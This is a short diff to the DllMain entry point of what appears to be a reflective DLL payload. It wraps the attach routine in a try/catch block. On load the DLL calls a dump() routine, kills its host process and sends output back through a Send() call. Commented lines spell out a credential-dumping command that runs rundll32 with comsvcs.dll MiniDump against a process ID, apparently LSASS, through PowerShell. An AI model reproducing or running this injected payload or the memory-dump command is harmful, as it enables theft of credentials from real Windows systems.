@@ -92,18 +92,25 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 				*(HMODULE *)lpReserved = hAppInstance;
 			break;
 		case DLL_PROCESS_ATTACH:
-			hAppInstance = hinstDLL;
-           // MessageBoxA(NULL, "Hello from Reflective DLL!", "Success", MB_OK);
-			//Url = (char*)lpReserved;
-			//Url = "https://www.google.com";
-		    //ShellExecute(0, 0, Url, 0, 0, SW_SHOW); // open the url
-			//system("Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1092 dump.bin full");
-			//ShellExecute(NULL, "open", "powershell", "/c  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1092 C:\\Windows\\Temp\\dump.dmp full", NULL, SW_NORMAL);
-			dump();
-			ExitProcess(0);
-			out<< "exit host process." << std::endl;
-			Send(out.str().c_str());
-			//Send("Evening the Odds.");
+			try
+			{
+				hAppInstance = hinstDLL;
+				// MessageBoxA(NULL, "Hello from Reflective DLL!", "Success", MB_OK);
+				//Url = (char*)lpReserved;
+				//Url = "https://www.google.com";
+				//ShellExecute(0, 0, Url, 0, 0, SW_SHOW); // open the url
+				//system("Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1092 dump.bin full");
+				//ShellExecute(NULL, "open", "powershell", "/c  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1092 C:\\Windows\\Temp\\dump.dmp full", NULL, SW_NORMAL);
+				dump();
+				ExitProcess(0);
+				out<< "exit host process." << std::endl;
+				Send(out.str().c_str());
+				//Send("Evening the Odds.");
+			}
+			catch (...)
+			{
+				return FALSE;
+			}
 			break;
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
